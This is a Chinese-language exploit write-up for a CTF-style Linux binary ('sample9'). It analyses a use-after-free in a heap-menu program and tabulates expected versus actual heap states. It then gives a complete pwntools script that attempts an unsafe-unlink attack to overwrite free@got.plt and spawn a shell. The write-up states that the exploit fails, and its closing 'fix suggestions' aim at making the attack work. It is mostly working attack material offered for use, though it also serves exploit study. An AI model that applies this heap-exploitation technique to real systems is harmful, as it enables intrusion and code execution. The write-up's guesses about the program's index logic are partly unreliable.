# 漏洞利用文档

## 执行环境
基于反编译代码和调试记录分析，程序运行环境如下：
- **操作系统**：Linux x86_64
- **二进制类型**：ELF 64位可执行文件，动态链接
- **安全特性**（通过checksec推断）：
  - Stack Canary: 启用（调试记录中显示）
  - NX: 可能启用（常见配置）
  - PIE: 未启用（地址如0x4009C0固定）
  - RelRO: 部分（GOT可写）
- **依赖库**：glibc（通过ldd推断，exp中使用libc地址）
- **运行需求**：需要banner.txt文件，程序通过标准输入/输出交互

## 漏洞成因
**漏洞类型**：Use-After-Free (UAF)

**关键结构体**：
- 全局指针数组 `s`（地址0x6020D8），包含10个char*指针，用于管理堆内存

**漏洞分析**：
1. **释放后未置空**：在`sub_400AB7`（选项2）中，`free((&s)[v1])`释放堆内存后，未将对应指针置为NULL
2. **使用已释放指针**：在`sub_400B2F`（选项3）中，直接对已释放内存调用`strlen`和写入操作
3. **利用条件**：攻击者可分配→释放→编辑同一索引，实现UAF读写

**反编译代码关键点**：
```c
// 选项2：释放但不置NULL
free((&s)[v1]);

// 选项3：使用已释放指针
v2 = strlen((&s)[v1]);          // UAF读
sub_4008B6((&s)[v1], v2 + 1);   // UAF写
```

## 漏洞利用过程
exp旨在通过UAF实现任意地址写，修改GOT执行shell，但实际执行中因指针管理问题失败。以下为内存变化总结：

| 步骤 | 操作 | 预期堆变化 | 实际堆变化 | 全局指针数组状态 | 关键问题 |
|------|------|------------|------------|------------------|----------|
| 1 | 初始化 | 堆未分配 | 堆未初始化 | 全NULL | 正常初始状态 |
| 2 | 分配5chunk | 5个chunk分配 | 仅4个chunk分配 | 仅s[0]有效 | 指针数组未正确填充 |
| 3 | 释放索引3,4 | chunks入bins | bins为空 | s[3],s[4]为NULL | 释放无效指针失败 |
| 4 | 创建payload | 伪造chunk元数据 | payload写入成功 | s[0]指向payload | 利用条件不满足 |
| 5 | 释放索引4 | 触发unlink | 无变化 | s[4]为NULL | 释放失败 |
| 6 | 修改索引3 | 覆盖GOT条目 | 修改无效内存 | s[3]为NULL | 索引错误 |
| 7 | 修改索引0 | 写func_addr | 修改payload chunk | s[0]有效但错误 | 目标错误 |
| 8 | 释放索引2 | 触发shell | 无变化 | s[2]为NULL | 利用失败 |
| 9 | 交互 | 获得shell | 无响应 | 状态混乱 | 整体失败 |

**内存变化关键点**：
- **堆分配**：实际只分配了4个chunk（0x10e67000, 0x10e67110, 0x10e67220, 0x10e67330），而非exp预期的5个
- **bins状态**：始终为空，表明释放操作未成功
- **GOT状态**：free@got.plt从PLT地址解析到libc地址，但未被修改为func_addr
- **字符串缺失**："/bin/sh"未在堆中找到，只在libc中存在

## Exploit
```python
from pwn import *
context.log_level = 'debug'  # 启用调试输出
context.terminal = ['tmux', 'splitw', '-h']  # 设置调试终端
elf = ELF('./data/sample9')  # 加载目标ELF文件
p = process('./data/sample9')  # 启动进程
libc = elf.libc  # 获取libc基址
func_addr = 0x4009C0  # 目标函数地址（可能是后门或shell函数）
free_got_plt = 0x602018  # free@got.plt地址
p_addr = 0x6020D8  # 全局指针数组s的基址

def create(size, content):
    p.sendline(b'1')  # 选择分配功能
    p.sendline(str(size).encode())  # 发送分配大小
    p.send(content)  # 发送内容

def modify(idx, content1, content2):
    p.sendline(b'3')  # 选择编辑功能
    p.sendline(str(idx).encode())  # 发送索引
    p.send(content1)  # 发送第一部分内容
    p.send(content2)  # 发送第二部分内容

def delete(idx):
    p.sendline(b'2')  # 选择释放功能
    p.sendline(str(idx).encode())  # 发送索引

p.recvuntil('silent2')  # step.1: 等待程序初始化完成

# step.2: 分配5个堆块，但程序可能未正确记录指针
create(0x100, b'AAAA');create(0x100, b'BBBB');create(0x100, b'/bin/sh\x00');create(0x100, b'DDDD');create(0x100, b'EEEEE')

# step.3: 释放索引3和4，但由于指针无效可能失败
delete(3);delete(4)

# step.4: 构造payload进行堆利用
# payload结构：伪造chunk头 + 填充 + 伪造尾部
payload = p64(0) + p64(0x101) + p64(p_addr - 0x18) + p64(p_addr - 0x10) + b'A' * (0x100 - 0x20) + p64(0x100) + p64(0x210 - 0x100)
create(0x210, payload)  # 分配大chunk触发堆布局变化

# step.5: 再次释放索引4，期望触发unlink但失败
delete(4)

# step.6: 修改索引3，试图覆盖GOT但索引错误
modify(3, p64(free_got_plt)[0:4], b'1111')

# step.7: 修改索引0，写入目标函数地址
modify(0, p64(func_addr)[0:6], b'2222')

# step.8: 释放索引2，期望触发shell执行
delete(2)

# step.9: 进入交互模式，但利用失败无shell
p.interactive()
```

**exp问题分析**：
- **指针管理错误**：全局数组`s`仅s[0]被正确设置，其他索引指针为NULL，导致释放和编辑操作失败
- **索引混淆**：exp使用索引0-4，但程序可能使用不同索引逻辑
- **UAF未触发**：无chunk进入bins，无法利用UAF实现任意写
- **字符串缺失**："/bin/sh"未正确写入堆中，导致无法执行shell

**修复建议**：
1. 检查程序索引逻辑，确保指针数组正确填充
2. 验证chunk分配和释放顺序
3. 确保关键字符串如"/bin/sh"正确写入可访问内存
4. 调整payload构造以适应实际堆布局
